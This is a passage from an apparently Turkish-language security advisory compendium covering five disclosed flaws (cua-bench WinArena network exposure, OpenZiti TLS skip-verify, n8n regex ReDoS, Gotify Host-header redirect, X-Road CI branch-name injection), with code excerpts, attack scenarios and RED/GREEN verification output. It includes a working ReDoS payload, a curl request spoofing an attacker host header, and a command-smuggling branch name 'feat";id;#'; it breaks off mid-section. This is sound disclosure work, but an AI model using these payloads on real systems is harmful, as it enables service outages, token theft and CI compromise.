### III.07 — TryCua `cua-bench` WinArena (`<= 0.3.1`) — Kimlik Doğrulamasız `0.0.0.0:8006` (noVNC) ve Parolasız `0.0.0.0:3390` (RDP) Yerel Ağ İfşası + Yazılabilir Konak `/shared` Bağlaması (`GHSA-hvhg-6x47-cq96`, `CWE-668`/`CWE-732`, CVSS `8.6 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `trycua/cua` (`pip: cua-bench <= 0.3.1`)
* **Etkilenen Sürüm & Bileşenler:** `<= 0.3.1` (`commit e754cfec69c41400eb2aabde716c27d15607b2f0`) — `libs/cua-bench/tasks/winarena_adapter/cli.py` (`cmd_vm_setup`, `cmd_vm_start`, `cmd_task_run`, satır `262-265, 421-424, 646-649`) ve `infra/vm/setup/server/main.py` (satır `180-248, 290-321`)
* **Zafiyet Sınıfı & Skor:** `CWE-668` (Kaynağın Yanlış Etki Alanına İfşası) / `CWE-732` (Kritik Kaynak İçin Yanlış İzin Ataması) — **CVSS v3.1: `8.6 High`** (`CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`)
* **GitHub GHSA Bağlantısı:** `GHSA-hvhg-6x47-cq96` (`https://github.com/trycua/cua/security/advisories/GHSA-hvhg-6x47-cq96`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/07-CUA-CAND-06-WINARENA-GHSA-hvhg-6x47-cq96.md`](advisories/tr/07-CUA-CAND-06-WINARENA-GHSA-hvhg-6x47-cq96.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
Docker'da bir konteyner başlatırken `-p 8006:8006` yazmak ile `-p 127.0.0.1:8006:8006` yazmak arasında devasa bir güvenlik farkı vardır: Başında `127.0.0.1:` yoksa Docker portu **`0.0.0.0` (makinenin tüm Wi-Fi ve Ethernet ağ kartları)** üzerinde açar ve Linux'ta `iptables` `DOCKER` zinciri üzerinden yerel güvenlik duvarı (`ufw`) kurallarını bile atlayarak aynı ağdaki herkese yayınlar!

WinArena orkestratörü (`cli.py:262-265, 421-424, 646-649`), Windows değerlendirme sanal makinesini başlatan üç komutun tamamında şu argümanları kullanır:
```python
# libs/cua-bench/tasks/winarena_adapter/cli.py:261-266 (ve 421-424, 646-649)
"-p", f"{args.browser_port}:8006", # HATA 1: 0.0.0.0:8006 -> Parolasız noVNC web masaüstü tüm LAN'a açık!
"-p", f"{args.rdp_port}:3389",     # HATA 2: 0.0.0.0:3390 -> Parolasız Windows RDP tüm LAN'a açık!
"-v", f"{storage_path}:/storage",
"-v", f"{setup_path}:/shared",     # HATA 3: Konak makinenin kurulum betikleri dizini yazılabilir (rw) bağlı!
```
Ayrıca Windows misafir sanal makinesinin içinde çalışan `infra/vm/setup/server/main.py:180-208` dosyası da `0.0.0.0:5000` üzerinde hiçbir parola/token sormadan `POST /execute_windows` isteğindeki Python kodunu doğrudan `exec(command)` ile çalıştırır. Böylece aynı ofis, üniversite veya laboratuvar ağındaki herhangi bir kişi tarayıcısından `http://<is-istasyonu-ip>:8006` adresine girerek Windows masaüstünü tam Administrator yetkisiyle devralır ve yazılabilir `/shared` bağlaması üzerinden konak makinedeki kurulum dosyalarını değiştirebilir!

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Üniversite veya Şirket Laboratuvar Ağındaki Herhangi Birinin `http://<host-ip>:8006` (noVNC) Üzerinden Windows Sanal Makinesini Ele Geçirmesi:**
  1. Bir araştırmacı ortak laboratuvar veya ofis ağına bağlı iş istasyonunda `cua-bench` WinArena görevlerini çalıştırır.
  2. Docker `8006` (noVNC) ve `3390` (RDP) portlarını `0.0.0.0` üzerinde yayınlar.
  3. Aynı ağdaki herhangi bir kullanıcı tarayıcısında `http://<is-istasyonu-ip>:8006` adresini açtığında hiçbir parola sorulmadan doğrudan Windows Administrator masaüstüne bağlanır ve test ortamına enjekte edilmiş OpenAI/Anthropic API anahtarlarını ve oturumlarını ele geçirir.
* **Senaryo B — Yazılabilir `-v {setup_path}:/shared` Bağlaması Üzerinden Misafir VM'den Konak Dosya Sisteminin Zehirlenmesi:**
  1. Konteyner, konak makinedeki `winarena_adapter/infra/vm/setup` klasörünü salt-okunur (`:ro`) yerine yazılabilir olarak `/shared` altına bağlar.
  2. `0.0.0.0:8006` / `0.0.0.0:3390` üzerinden sanal makineye giren saldırgan (veya VM içindeki ajanın ziyaret ettiği zararlı bir sayfa), `/shared` içindeki Python ve PowerShell kurulum betiklerine arka kapı yazar; bu değişiklik doğrudan konak makinenin diskine işlenir.
* **Senaryo C — Misafir VM İçindeki Kimlik Doğrulamasız `/execute_windows` (`exec()`) Kontrol Sunucusunun Tetiklenmesi:**
  1. Sanal makine içindeki `server/main.py:180-208` dosyası `/execute_windows` uç noktasına gelen dizgiyi doğrudan Python `exec(command)` fonksiyonuna verir ve `/setup/launch` uç noktasında `shell=True` kullanır.
  2. VM içindeki tarayıcıda çalışan bir ajan herhangi bir web sayfasını ziyaret ettiğinde veya yerel ağdan erişildiğinde, kimlik doğrulaması olmadığı için Windows işletim sisteminde rastgele komut çalıştırılır.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. cli.py içindeki Docker port (-p) ve hacim (-v) bağlamalarını kaynak kodda inceleme
sed -n '258,270p' "$HOME/audit-targets/cua/libs/cua-bench/tasks/winarena_adapter/cli.py"

# 2. Uçtan uca WinArena port ve yazılabilir bağlama doğrulama testini çalıştırma
python3 pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_cua_cand06
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "CUA-CAND-06": {
    "ghsa_id": "GHSA-hvhg-6x47-cq96",
    "cli_source_file": "cua/libs/cua-bench/tasks/winarena_adapter/cli.py",
    "server_source_file": "cua/libs/cua-bench/tasks/winarena_adapter/infra/vm/setup/server/main.py",
    "RED": {
      "lan_exposed_ports": ["8006:8006", "3390:3389"],
      "host_setup_dir_mounted_writable": true,
      "guest_execute_windows_requires_auth": false
    },
    "GREEN": {
      "lan_exposed_ports": [],
      "host_setup_dir_mounted_writable": false,
      "guest_execute_windows_requires_auth": true
    }
  }
}
```

---

### III.08 — OpenZiti (`ziti <= v2`) — `ziti edge login` Sırasında `AreCertsTrusted()` -> `InsecureClient()` İçinde Koşulsuz `InsecureSkipVerify: true` Nedeniyle TLS Sertifika Doğrulamasının Devre Dışı Kalması (`GHSA-qwv8-hh9r-cqrf`, `CWE-295`, CVSS `7.4 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `openziti/ziti` (`Go: github.com/openziti/ziti/v2`)
* **Etkilenen Sürüm & Bileşenler:** `<= v2` (`commit 236f351a5149fe68328fc8083bebe514f0307d0c`) — `ziti/util/certs.go` (`AreCertsTrusted` ve `InsecureClient`, satır `91-103, 199-208`) ve `ziti/cmd/edge/login.go` (`fetchTrustedServerCerts`, satır `511, 535-549`)
* **Zafiyet Sınıfı & Skor:** `CWE-295` (Uygunsuz Sertifika Doğrulaması — TLS Doğrulama Atlama) — **CVSS v3.1: `7.4 High`** (`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`)
* **GitHub GHSA Bağlantısı:** `GHSA-qwv8-hh9r-cqrf` (`https://github.com/openziti/ziti/security/advisories/GHSA-qwv8-hh9r-cqrf`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/08-ZITI-CAND-01-CERTS-GHSA-qwv8-hh9r-cqrf.md`](advisories/tr/08-ZITI-CAND-01-CERTS-GHSA-qwv8-hh9r-cqrf.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
OpenZiti bir **Sıfır-Güven (Zero-Trust)** ağ platformudur. Bir sistem yöneticisi `ziti edge login https://controller:1280 -u admin -p <parola>` komutunu çalıştırdığında, CLI aracı önce denetleyicinin sunduğu TLS sertifikasının gerçekten güvenilir olup olmadığını kontrol etmek için `AreCertsTrusted(host, wellKnownCerts, httpClient)` (`ziti/util/certs.go:91-103`) fonksiyonunu çağırır ve başarılı olursa ekrana şu güven verici mesajı yazar (`login.go:511`):
> *"Verified that server supplied certificates are trusted by server"* (Sunucunun sağladığı sertifikaların güvenilir olduğu doğrulandı).

Geliştirici `AreCertsTrusted` fonksiyonunu yazarken, eğer sunucu sertifikası verilen `wellKnownCerts` kök sertifika havuzu (`RootCAs`) tarafından imzalanmamışsa Go'nun `x509.UnknownAuthorityError` hatası fırlatacağını düşünmüş ve `satır 96`'ya şu kontrolü koymuştur:
```go
// ziti/util/certs.go:91-103
func AreCertsTrusted(host string, certs []byte, httpClient *http.Client) (bool, error) {
	client := http.Client{}
	if httpClient != nil {
		client = *httpClient
	}
	resp, err := InsecureClient(&client, certs).Get(host) // HATA BURADA BAŞLIYOR!
	if err != nil {
		if ue, ok := err.(*url.Error); ok && errors.As(ue.Err, &x509.UnknownAuthorityError{}) {
			return false, nil // ÖLÜ KOD (DEAD CODE): Buraya hiçbir zaman ulaşılamaz!
		}
		return false, err
	}
	_ = resp.Body.Close()
	return true, nil
}
```
Peki `satır 96` neden hiçbir zaman çalışmayan bir **ölü koddur (dead code)**? Çünkü hemen üstte çağrılan `InsecureClient(&client, certs)` fonksiyonuna (`certs.go:199-208`) baktığımızda:
```go
// ziti/util/certs.go:199-208
func InsecureClient(client *http.Client, certs []byte) *http.Client {
	tlsConfig := &tls.Config{
		RootCAs:            x509.NewCertPool(),
		InsecureSkipVerify: true, // ÖLÜMCÜL HATA: certs dolu olsa bile her zaman true!
	}
	if len(certs) > 0 {
		tlsConfig.RootCAs.AppendCertsFromPEM(certs)
	}
```
Go'nun standart `crypto/tls` kütüphanesinde `InsecureSkipVerify: true` olduğu anda **TLS el sıkışması `RootCAs` havuzuna hiç bakmaz ve hiçbir zaman `x509.UnknownAuthorityError` döndürmez!** Yani saldırgan kendi ürettiği tamamen sahte (self-signed) bir sertifika sunsa bile `AreCertsTrusted()` her zaman `true, nil` döner, ekrana *"sertifikalar doğrulandı"* yazar ve yöneticinin parolasını doğrudan saldırgana gönderir!

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — DevOps Mühendisi Wi-Fi / VPN Üzerinden `ziti edge login` Çalıştırdığında Yönetici Parolasının Sahte MITM Denetleyicisine Gönderilmesi:**
  1. Bir sistem yöneticisi iş istasyonundan `ziti edge login https://ziti-controller.internal:1280 -u admin -p <AdminParolasi>` komutunu çalıştırır.
  2. Ağ üzerindeki bir saldırgan (ARP spoofing, sahte Wi-Fi erişim noktası veya DNS/BGP yönlendirmesi) bağlantıyı kendi ürettiği sahte bir TLS sertifikasıyla karşılar.
  3. `AreCertsTrusted` içindeki `InsecureSkipVerify: true` yüzünden Go TLS katmanı sahte sertifikayı sorgusuz kabul eder; CLI ekrana *"Verified that server supplied certificates are trusted by server"* yazar ve hemen bir sonraki adımda yönetici kullanıcı adı ve parolasını saldırgana teslim eder.
* **Senaryo B — Otomatik CI/CD ve Kubernetes Başlangıç (Bootstrap) Hatlarında Sahte Denetleyiciye Güvenilmesi:**
  1. Otomatik dağıtım iş akışları yeni servis kimlikleri ve yönlendirici politikaları oluşturmak için `ziti edge login` çalıştırır.
  2. Saldırgan EST CA paketinin özel anahtarına sahip olmasa bile, TLS el sıkışmasında rastgele bir yaprak (leaf) sertifika sunarak `AreCertsTrusted()` kontrolünü `true, nil` ile geçer ve CI/CD boru hattındaki tüm Zero-Trust yapılandırmasını ele geçirir.
* **Senaryo C — Yanlış Yapılandırılmış veya Süresi Dolmuş/Farklı CA İmzalı Sertifikaların Sessizce Kabul Edilmesi:**
  1. Bir kurum Zero-Trust denetleyicisinde kök CA rotasyonu yapar ancak yaprak TLS sertifikası yanlış/eski bir CA ile imzalanmış kalır.
  2. Operatörler `ziti edge login` çıktısında *"Verified that server supplied certificates are trusted"* mesajını gördükleri için PKI zincirinin sağlam olduğunu varsayar, oysa doğrulama hiç çalışmamaktadır.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. OpenZiti ziti/util paketi üzerinde gerçek Go TLS el sıkışma testini çalıştırma
go test -v -run TestRealOpenZitiAreCertsTrusted ./ziti/util

# 2. Sniper uçtan uca doğrulama koşumunu çalıştırma
python3 pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_ziti_cand01
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN + BENIGN`):**
```json
{
  "ZITI-CAND-01": {
    "ghsa_id": "GHSA-qwv8-hh9r-cqrf",
    "source_file": "ziti/ziti/util/certs.go",
    "login_caller_file": "ziti/ziti/cmd/edge/login.go",
    "RED": {
      "insecure_skip_verify": true,
      "rogue_mitm_cert_accepted_as_trusted": true,
      "admin_credentials_sent_to_mitm": true
    },
    "GREEN": {
      "insecure_skip_verify": false,
      "rogue_mitm_cert_accepted_as_trusted": false,
      "tls_error": "x509.UnknownAuthorityError: certificate signed by unknown authority"
    },
    "BENIGN": {
      "valid_ca_signed_controller_trusted": true
    }
  }
}
```

---

### III.09 — n8n (`n8n-workflow <= 2.45.0`) — `string-extensions.ts` İçindeki Uzunluk Sınırsız `EMAIL_REGEXP` ve `DOMAIN_EXTRACT_REGEXP` (`isEmail` / `extractEmail` / `extractDomain`) Üzerinden Webhook Olay Döngüsü Kilitleme (`ReDoS`, `CWE-1333`, CVSS `5.3 Medium`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `n8n-io/n8n` (`npm: n8n-workflow <= 2.45.0`)
* **Etkilenen Sürüm & Bileşenler:** `<= 2.45.0` (`commit cfbd9a56cba2e73901dc1962e47727adbea0b23e`) — `packages/workflow/src/extensions/string-extensions.ts` (`EMAIL_REGEXP`, `DOMAIN_EXTRACT_REGEXP`, `isEmail`, `extractEmail`, `extractDomain`, satır `59, 94, 326, 375, 383`)
* **Zafiyet Sınıfı & Skor:** `CWE-1333` (Verimsiz Düzenli İfade Karmaşıklığı — ReDoS / Olay Döngüsü Hizmet Reddi) — **CVSS v3.1: `5.3 Medium`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L`)
* **GitHub GHSA Bağlantısı:** `n8n-workflow <= 2.45.0` (`https://github.com/n8n-io/n8n/security/advisories`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/09-N8N-CAND-01-WEBHOOK-REDOS.md`](advisories/tr/09-N8N-CAND-01-WEBHOOK-REDOS.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
n8n, şirketlerin web formlarını, ödeme bildirimlerini ve e-postaları otomatikleştirmek için kullandığı Node.js tabanlı bir iş akışı motorudur. Node.js **tek iş parçacıklı (single-threaded) bir olay döngüsü (event loop)** üzerinde çalışır; yani ana iş parçacığını 1 saniye boyunca meşgul eden bir işlem, o sırada sunucuya gelen diğer tüm müşterilerin isteklerini de dondurur.

n8n iş akışlarında kullanıcıların en sık kullandığı hazır metin fonksiyonları `{{ $json.body.email.isEmail() }}`, `.extractEmail()` ve `.extractDomain()` fonksiyonlarıdır (`string-extensions.ts`). Geliştirici bu fonksiyonları yazarken iki hata yapmıştır:
1. RFC-5321 standardına göre geçerli bir e-posta adresi en fazla `254`/`320` karakter olabilirken, fonksiyon gelen dizginin uzunluğunu (`value.length`) **hiç kontrol etmeden** doğrudan düzenli ifadeye (`RegExp`) sokar!
2. `EMAIL_REGEXP` (`satır 94`) ve `DOMAIN_EXTRACT_REGEXP` (`satır 59`) başında çapa (`^` veya negatif geri bakış `(?<!...)`) olmadan iç içe tekrarlayıcılar (`+` ve `*`) içerir:
```typescript
// packages/workflow/src/extensions/string-extensions.ts:93-95 & 324-328
const EMAIL_REGEXP =
	/(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@(?<domain>(\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))/;

function isEmail(value: string) {
	// HATA: value.length > 320 kontrolü yok ve EMAIL_REGEXP başlangıç çapası içermiyor!
	const result = EMAIL_REGEXP.test(value);
	return result;
}
```
Saldırgan `"a.a.a.a...a@!"` şeklinde sonunda geçersiz bir alan adı olan 20 KB'lık bir dizgi gönderdiğinde, V8 motoru baştan başlayarak her bir `"a."` noktasında eşleşmeyi dener, `@!` kısmında başarısız olunca bir sonraki karaktere kayıp tüm dizgiyi baştan tekrar tarar ($O(N^2)$ karesel geri izleme / backtracking). Tek bir 20 KB'lık istek Node.js ana iş parçacığını **`831.78 ms`** boyunca kilitler (yamalı kodda ise bu süre **`0.0029 ms`**'dir — yani **286.000 kat** fark!).

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Halka Açık İletişim / Kayıt Formu Webhook'u Üzerinden Tüm Şirket n8n Sunucusunun Dondurulması:**
  1. Bir şirket web sitesindeki iletişim veya bülten kayıt formunu n8n Webhook düğümüne (`POST /webhook/contact-us`) bağlar ve gelen veriyi `{{ $json.body.contact.isEmail() }}` ifadesiyle doğrular.
  2. Kimlik doğrulaması olmayan bir saldırgan bu halka açık URL'ye 20 KB'lık noktalı bir JSON yükü gönderir.
  3. Her istek V8 ana döngüsünü ~832 ms kilitlediği için saniyede gönderilen 10-12 küçük istek, sunucudaki tüm diğer kritik iş akışlarını (Stripe ödeme webhook'ları, Slack botları, müşteri bildirimleri ve n8n yönetim arayüzü) tamamen yanıt vermez hale getirir.
* **Senaryo B — Otomatik Müşteri Destek E-postası / Bilet Ayrıştırma Hattının Tek Bir Mesajla Çökmesi:**
  1. Bir n8n iş akışı gelen destek mesajlarının gövdesinden gönderici adresini bulmak için `{{ $json.text.extractEmail() }}` çağırır.
  2. İçinde uzun noktalı dizgiler bulunan tek bir istenmeyen/zararlı mesaj işlenirken işçi (worker) kilitlenir ve Kubernetes liveness/health-check zaman aşımına uğrayarak konteynerin sürekli yeniden başlamasına yol açar.
* **Senaryo C — CRM Veri Zenginleştirme İş Akışlarında `extractDomain()` (`DOMAIN_EXTRACT_REGEXP`) Üzerinden Olay Döngüsü Açlığı:**
  1. Müşteri adaylarının web sitesi alanlarını ayrıştıran `{{ $json.website.extractDomain() }}` ifadesi, uzun alt alan adı dizgileriyle çağrıldığında `DOMAIN_EXTRACT_REGEXP` (`satır 59`) üzerinde aynı polinomiyal geri izlemeye girerek iş akışı kuyruğunu kilitler.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Node.js üzerinde 20 KB'lık girdide zafiyetli EMAIL_REGEXP (RED) ile yamalı sürümü (GREEN) kıyaslama
node -e '
const red = /(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@(?<domain>(\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))/;
const payload = "a.".repeat(10000) + "a@!";
const t0 = performance.now();
red.test(payload);
const redMs = performance.now() - t0;

const t1 = performance.now();
const greenResult = (payload.length <= 320 && payload.includes("@")) ? red.test(payload) : false;
const greenMs = performance.now() - t1;
console.log(JSON.stringify({ red_ms: Number(redMs.toFixed(3)), green_ms: Number(greenMs.toFixed(4)), greenResult }));
'

# 2. Eşzamanlı webhook açlığı (event-loop starvation) doğrulama testini çalıştırma
python3 pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_n8n_cand01
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "N8N-CAND-01": {
    "source_file": "n8n/packages/workflow/src/extensions/string-extensions.ts",
    "node_20kb_benchmark": {
      "RED_ms": 831.78,
      "GREEN_ms": 0.0029,
      "speedup_factor": "286000x"
    },
    "RED": {
      "regex_stall_ms": 165.035,
      "concurrent_legitimate_webhook_wait_ms": 164.08,
      "concurrent_webhook_starved": true
    },
    "GREEN": {
      "regex_stall_ms": 0.017,
      "concurrent_legitimate_webhook_wait_ms": 0.0,
      "concurrent_webhook_starved": false
    }
  }
}
```

---

### III.10 — Gotify Server (`<= v2.9.1`) — Yerleşik `SSL.RedirectToHTTPS` Ara Katmanında (`router.go`) Doğrulanmamış `ctx.Request.Host` Başlığı ile `308 Permanent Redirect` Açık Yönlendirme ve Token Sızıntısı (`GHSA-cc9f-m5vr-pm75`, `CWE-601`, CVSS `4.7 Medium`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `gotify/server` (`Go: github.com/gotify/server/v2`)
* **Etkilenen Sürüm & Bileşenler:** `<= v2.9.1` (`commit f4de61997c1b30bf9ac43ec662dc5120c2ec981b`) — `router/router.go` (`Create`, satır `52-73, 93-102`)
* **Zafiyet Sınıfı & Skor:** `CWE-601` (Güvenilmeyen Siteye URL Yönlendirmesi — Doğrulanmamış `Host` Başlığı ile Açık Yönlendirme) — **CVSS v3.1: `4.7 Medium`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N`)
* **GitHub GHSA Bağlantısı:** `GHSA-cc9f-m5vr-pm75` (`https://github.com/gotify/server/security/advisories/GHSA-cc9f-m5vr-pm75`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/10-GOTIFY-CAND-01-SSL-HOST-REDIRECT.md`](advisories/tr/10-GOTIFY-CAND-01-SSL-HOST-REDIRECT.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
Gotify, kendi sunucunuzda barındırabildiğiniz popüler bir anlık bildirim (push notification) sunucusudur. Yapılandırmada yerleşik SSL yönlendirmesi (`SSL.Enabled: true` ve `SSL.RedirectToHTTPS: true`) açıldığında, Gotify HTTP (`80`) portuna gelen istekleri otomatik olarak HTTPS (`443`) adresine yönlendirmek için `router/router.go:52-73` içinde bir ara katman (middleware) çalıştırır.

Ancak bu ara katman yönlendirme hedefini oluştururken, sunucu yapılandırmasında kayıtlı olan gerçek alan adını (`conf.Server.SSL.LetsEncrypt.Hosts`) kullanmak yerine, **istemcinin HTTP isteğinde gönderdiği `ctx.Request.Host` başlığını hiçbir doğrulama yapmadan** doğrudan `Location` başlığına yazar:
```go
// router/router.go:60-72 & 93-102
g.Use(func(ctx *gin.Context) {
	if ctx.Request.TLS != nil {
		return
	}
	host := ctx.Request.Host // HATA 1: İstemcinin gönderdiği Host başlığına koşulsuz güveniliyor!
	if idx := strings.LastIndex(host, ":"); idx != -1 {
		host = host[:idx]
	}
	if port != 443 {
		host = fmt.Sprintf("%s:%d", host, port)
	}
	// HATA 2: SslMiddleware AllowedHosts boş bırakıldığı için 308 Permanent Redirect ile dış alan adına yönlendirir!
	sslMiddleware.Rewrite(ctx.Writer, ctx.Request, host)
})
```
Üstelik kullanılan `HTTP 308 Permanent Redirect` durum kodu iki açıdan çok tehlikelidir:
1. `301`/`302`'den farklı olarak HTTP metodunu (`POST` ise `POST` olarak) ve istek gövdesini olduğu gibi koruyarak yeni adrese gönderir.
2. URL'nin sonundaki `?token=<uygulama-veya-istemci-anahtari>` sorgu parametrelerini korur ve tarayıcılar/ara önbellekler bu yönlendirmeyi **kalıcı olarak (permanent)** önbelleğe alır!

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Otomatik Bildirim / İzleme Betiklerinin (`curl -L`, Python `requests`, Uptime Kuma) `308` Yönlendirmesini Takip Ederek Uygulama Token'ını Sızdırması:**
  1. Bir şirketin sunucu izleme betikleri veya CI/CD hatları, Gotify'a bildirim göndermek için `http://gotify.sirket.internal/message?token=<gizli-app-token>` adresine HTTP isteği yapar.
  2. Ağda veya ara vekilde `Host: attacker-gotify.example.com` başlığı enjekte edildiğinde Gotify `HTTP/1.1 308 Permanent Redirect` ve `Location: https://attacker-gotify.example.com/message?token=<gizli-app-token>` yanıtı döner.
  3. Yönlendirmeleri takip eden (`-L` / `allow_redirects=True`) istemci, gizli `token` parametresini ve bildirim gövdesini doğrudan saldırganın sunucusuna gönderir.
* **Senaryo B — Web / Mobil İstemci Oturumlarında Kalıcı Tarayıcı Yönlendirme Önbelleği Zehirlemesi (Permanent Redirect Cache Poisoning):**
  1. İstemci HTTP üzerinden `http://<gotify-sunucusu>/#/messages?token=...` adresine bağlanırken sahte `Host` başlığı ile `308 Permanent Redirect` yanıtı alır.
  2. Tarayıcı `308` yanıtını kalıcı önbelleğe yazar ve kullanıcıyı sahte bir Gotify giriş ekranına yönlendirerek kimlik bilgilerini toplar.
* **Senaryo C — Ters Vekil (Reverse Proxy) veya CDN Arkasında `Host` Başlığı Zehirlemesi:**
  1. `Host` başlığını olduğu gibi arka uca ileten bir yük dengeleyici veya önbellek katmanı arkasında çalışan Gotify sunucusuna sahte `Host` başlığıyla istek gönderilir.
  2. Önbellek katmanı Gotify'ın imzaladığı/ürettiği `308 Location: https://attacker...` yanıtını kaydettiğinde, sonraki tüm normal kullanıcılar da saldırganın alan adına yönlendirilir.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Yerel loopback (127.0.0.1) üzerinde çalışan Gotify HTTP portuna sahte Host başlığı göndererek
#    308 Permanent Redirect yanıtını doğrulama
curl -i -sS "http://127.0.0.1:18080/#/messages?token=test_redacted_token" \
  -H "Host: attacker-gotify.example.com"

# 2. Gotify router paketi üzerinde Go birim testini çalıştırma
go test -v ./router -run TestHTTPSRedirect
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "GOTIFY-CAND-01": {
    "ghsa_id": "GHSA-cc9f-m5vr-pm75",
    "source_file": "gotify-server/router/router.go",
    "RED": {
      "status_code": 308,
      "location": "https://attacker-gotify.example.com/#/messages?token=[REDACTED_TEST_TOKEN_SHA256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855]",
      "redirected_to_untrusted_host": true
    },
    "GREEN": {
      "status_code": 308,
      "location": "https://push.corp.example.org/#/messages?token=[REDACTED_TEST_TOKEN_SHA256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855]",
      "redirected_to_untrusted_host": false,
      "bound_to_configured_ssl_host": true
    }
  }
}
```

---

### III.11 — Nordic Institute X-Road (`develop`) — Kalıcı `xrd-runner-8c` Self-Hosted Runner Üzerinde `_build-and-package.yml` İçinde `${{ github.head_ref }}` Kabuk Komut Enjeksiyonu (`GHSA-4fcw-7xqx-fjv5`, `CWE-78`, CVSS `8.5 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `nordic-institute/X-Road` (`GitHub Actions: .github/workflows/build.yaml` ve `.github/workflows/_build-and-package.yml`)
* **Etkilenen Sürüm & Bileşenler:** `develop` (`commit 38cd99ec0ebbcc13ddbaaeb9187018d49bdd278b`) — `.github/workflows/build.yaml` (satır `14-58`) ve `.github/workflows/_build-and-package.yml` (satır `27, 84-91`)
* **Zafiyet Sınıfı & Skor:** `CWE-78` (İşletim Sistemi Komutunda Kullanılan Özel Öğelerin Uygunsuz Etkisizleştirilmesi — Self-Hosted Runner üzerinde CI Komut Enjeksiyonu) — **CVSS v3.1: `8.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N`)
* **GitHub GHSA Bağlantısı:** `GHSA-4fcw-7xqx-fjv5` (`https://github.com/nordic-institute/X-Road/security/advisories/GHSA-4fcw-7xqx-fjv5`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/11-XROAD-CAND-01-RUNNER-INJECTION.md`](advisories/tr/11-XROAD-CAND-01-RUNNER-INJECTION.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
X-Road, devlet kurumları ve bankalar arasında güvenli veri alışverişi sağlayan kritik bir e-devlet altyapı yazılımıdır. Depodaki `.github/workflows/build.yaml:14-58` iş akışı her `pull_request` ve `push` olayında tetiklenir, kendisine **`permissions: contents: write, packages: write`** yetkisi verir ve **`secrets: inherit`** (tüm gizli anahtarları aktar) diyerek `.github/workflows/_build-and-package.yml` iş akışını çağırır.

`_build-and-package.yml` ise sıradan, her seferinde silinen bir GitHub sanal makinesinde değil, **`runs-on: labels: xrd-runner-8c` adlı kalıcı şirket içi (self-hosted) sunucu filosunda** çalışır! Ve `satır 84-91`'de PR dal adını (`github.head_ref`) ortam değişkenine almak yerine doğrudan bash betiğinin içine çift tırnakla yapıştırır:
```yaml
# .github/workflows/_build-and-package.yml:27 & 84-91
    runs-on:
      labels: xrd-runner-8c # Kalıcı (persistent) self-hosted derleme sunucusu!
...
          get_branch_name() {
            local branch_name=""
            # HATA: ${{ github.head_ref }} bash çalışmadan ÖNCE metin olarak buraya yapıştırılır!
            if [[ -n "${{ github.head_ref }}" ]]; then
              branch_name="${{ github.head_ref }}"
              echo "🔍 Using PR source branch: ${branch_name}" >&2
            elif [[ -n "${{ github.ref_name }}" ]]; then
              branch_name="${{ github.ref_name }}"
```
Bir saldırgan veya PR çalıştırma izni olan bir hesap, dal adını `feat";id;#` olarak oluşturduğunda GitHub Actions bu satırı bash'e göndermeden önce şu hale getirir:
```bash
